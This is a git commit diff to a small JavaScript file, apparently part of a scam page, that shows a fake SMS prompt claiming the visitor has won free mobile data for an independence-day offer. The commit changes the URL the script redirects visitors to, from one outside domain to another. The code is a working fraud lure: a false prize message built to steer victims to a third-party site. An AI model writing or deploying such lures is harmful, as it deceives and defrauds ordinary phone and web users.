593aee1026b80e93d2d51e274e79775981bd223d
bigetijazz6 <bigetijazz6@gmail.com>
2024-07-05 18:16:17 -0700

    Update independencedaysms.js

--- independencedaysms.js
+++ independencedaysms.js
@@ -2,5 +2,5 @@
 var password = '1'
 password=prompt('SMS: Congratulations you have been selected to receive 10gb free data independence day offer, Kindly press 1 to proceed now','1');
 if (password != '1') {
-location.href='https://damba-fest.org/malawi-independence.html';
+location.href='https://www.offre-beta.shop/Malawi-independence';
 }
